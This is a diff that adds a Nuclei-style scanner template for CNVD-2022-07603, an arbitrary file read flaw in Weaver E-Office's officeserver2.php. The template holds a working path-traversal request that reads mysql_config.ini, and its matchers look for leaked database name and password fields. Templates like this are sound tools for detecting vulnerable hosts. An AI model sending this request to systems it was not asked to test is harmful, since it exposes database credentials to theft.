@@ -1,0 +1,22 @@
+id: cnvd-2022-07603
+info:
+  name: 泛微E-Office officeserver2 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: arbitrary-file-read,cnvd-2022-07603
+http:
+  - method: GET
+    path:
+      - "/iweboffice/officeserver2.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<DBSTEP>"
+          - "STATUS=IQ=="
+          - "dataname ="
+          - "datapassword ="
